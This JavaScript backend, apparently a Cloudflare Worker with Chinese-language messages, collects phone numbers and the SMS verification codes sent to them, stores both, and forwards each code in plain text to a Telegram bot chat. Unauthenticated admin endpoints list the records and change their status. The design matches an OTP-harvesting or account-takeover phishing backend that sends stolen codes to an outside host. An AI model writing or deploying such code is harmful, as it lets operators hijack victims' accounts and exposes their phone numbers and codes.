import { TG_BOT_TOKEN, TG_CHAT_ID } from './config.js';

export async function verifyPhone(request, { env }) {
    const { phone } = await request.json();
    
    if (!phone || !/^\+?[1-9]\d{1,14}$/.test(phone)) {
        return new Response(JSON.stringify({ message: '无效的手机号格式' }), { status: 400 });
    }

    if (phone.startsWith('+86') && !/^\+86[1][3-9]\d{9}$/.test(phone)) {
        return new Response(JSON.stringify({ message: '无效的中国手机号格式' }), { status: 400 });
    }

    const { results } = await env.DB.prepare(
        "SELECT status FROM phone_records WHERE phone = ?"
    ).bind(phone).all();

    if (results.length > 0 && results[0].status === 4) {
        return new Response(JSON.stringify({ message: '该手机号无效,请尝试使用其他手机号' }), { status: 400 });
    }

    return new Response(JSON.stringify({ message: '验证通过' }), { status: 200 });
}

export async function checkStatus(request, { env }) {
    const url = new URL(request.url);
    const phone = url.searchParams.get('phone');

    const { results } = await env.DB.prepare(
        "SELECT * FROM phone_records WHERE phone = ?"
    ).bind(phone).all();

    if (results.length === 0) {
        return new Response(JSON.stringify({ status: 0 }), { status: 200 });
    }

    return new Response(JSON.stringify(results[0]), { status: 200 });
}

export async function register(request, { env }) {
    const { phone } = await request.json();

    await env.DB.prepare(
        "INSERT INTO phone_records (phone, status, created_at) VALUES (?, 1, unixepoch())"
    ).bind(phone).run();

    await sendTelegramNotification(`手机号：${phone}申请注册,请处理。`, env);

    return new Response(JSON.stringify({ message: '注册申请已提交' }), { status: 200 });
}

export async function submitCode(request, { env }) {
    const { phone, code } = await request.json();

    await env.DB.prepare(
        "UPDATE phone_records SET status = 2, code = ?, created_at = unixepoch() WHERE phone = ?"
    ).bind(code, phone).run();

    await sendTelegramNotification(`正在注册,手机号：${phone},验证码：${code}`, env);

    return new Response(JSON.stringify({ message: '验证码已提交' }), { status: 200 });
}

export async function getAdminRecords(request, { env }) {
    console.log('getAdminRecords function called');
    const url = new URL(request.url);
    const page = parseInt(url.searchParams.get('page')) || 1;
    const limit = parseInt(url.searchParams.get('limit')) || 10;
    const offset = (page - 1) * limit;

    const { results } = await env.DB.prepare(
        "SELECT *, (SELECT COUNT(*) FROM phone_records) as total FROM phone_records ORDER BY created_at DESC LIMIT ? OFFSET ?"
    ).bind(limit, offset).all();

    const total = results.length > 0 ? results[0].total : 0;
    const totalPages = Math.ceil(total / limit);

    // 将 REAL 类型的时间戳转换为可读的日期字符串
    const records = results.map(record => ({
        ...record,
        created_at: new Date(record.created_at * 1000).toISOString()
    }));

    return new Response(JSON.stringify({ 
        records: records, 
        currentPage: page, 
        totalPages: totalPages 
    }), { 
        status: 200,
        headers: { 'Content-Type': 'application/json' }
    });
}

export async function updateAdminStatus(request, { env }) {
    const { phone, status } = await request.json();

    const result = await env.DB.prepare(
        "UPDATE phone_records SET status = ? WHERE phone = ?"
    ).bind(status, phone).run();

    if (result.changes > 0) {
        return new Response(JSON.stringify({ message: '状态更新成功' }), { status: 200 });
    }

    return new Response(JSON.stringify({ message: '未找到该手机号记录' }), { status: 404 });
}

async function sendTelegramNotification(message, env) {
    const url = `https://api.telegram.org/bot${env.TG_BOT_TOKEN}/sendMessage`;
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: env.TG_CHAT_ID,
                text: message,
            }),
        });

        if (!response.ok) {
            console.error('Failed to send Telegram notification', await response.text());
        }
    } catch (error) {
        console.error('Error sending Telegram notification:', error);
    }
}